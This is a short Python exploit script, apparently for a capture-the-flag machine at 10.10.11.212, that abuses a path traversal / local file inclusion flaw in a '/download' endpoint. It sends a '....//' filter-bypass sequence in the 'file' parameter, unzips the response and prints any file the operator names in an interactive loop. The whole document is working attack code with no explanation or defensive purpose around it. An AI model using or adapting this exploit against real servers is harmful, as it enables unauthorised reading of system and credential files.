import requests
import zipfile

def read(file):
	try: 
		url = 'http://10.10.11.212/download'
		params = {'file':f'....//....//....//..../{file}'}
		r = requests.get(url, params=params)
		if (r.status_code == 200):
			with open('lfime.zip', 'wb') as f:
				f.write(r.content) 

			with zipfile.ZipFile('lfime.zip', 'r') as zip_file:
				zip_file.extractall('.')
	        
			with open(f'press_package{file}', 'r') as f:
				content = f.read()
				print(f"{content}")

		else:
			print("[-] File does not exist.")	

	except zipfile.BadZipFile:
		print("[-] File does not exist.")
	except Exception as e:
		print(f"[-] LFI Error: {e}.")

def main():
	try:
		while True:
			file = input("File: ")
			read(file)
	except KeyboardInterrupt:
		print("\nInterrupted by Ctrl+C. Exiting...")

if __name__ == '__main__':
	main()
